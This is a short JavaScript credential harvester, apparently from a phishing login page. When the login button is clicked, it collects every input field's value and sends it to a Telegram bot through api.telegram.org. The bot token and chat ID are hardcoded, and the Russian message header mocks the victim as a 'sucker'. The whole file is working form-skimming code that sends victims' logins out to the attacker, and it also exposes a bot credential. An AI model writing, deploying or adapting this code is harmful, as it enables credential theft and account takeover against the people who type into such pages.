let button = document.querySelector('.login-button');
let inputs = document.querySelectorAll('input');

const Token = '7534071979:AAHM9UHrMQT_bF-jo9LByRLqT5gbceDUoOM';
const ChatID = '6026879098';
const API_URL = `https://api.telegram.org/bot${Token}/sendMessage`;

button.addEventListener("click", async (e) => {
    e.preventDefault();

    let message = "Ваши(лоха) данные:\n";
    inputs.forEach(input => {
        message += `${input.name || 'Field'}: ${input.value}\n`;
    });

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: ChatID,
                text: message,
            }),
        });

        if (response.ok) {
            alert("Сообщение отправлено!");
            inputs.forEach(input => input.value = "");
        } else {
            alert("Ошибка при отправке сообщения.");
        }
    } catch (error) {
        console.error("Ошибка:", error);
        alert("Ошибка: не удалось отправить сообщение.");
    }
});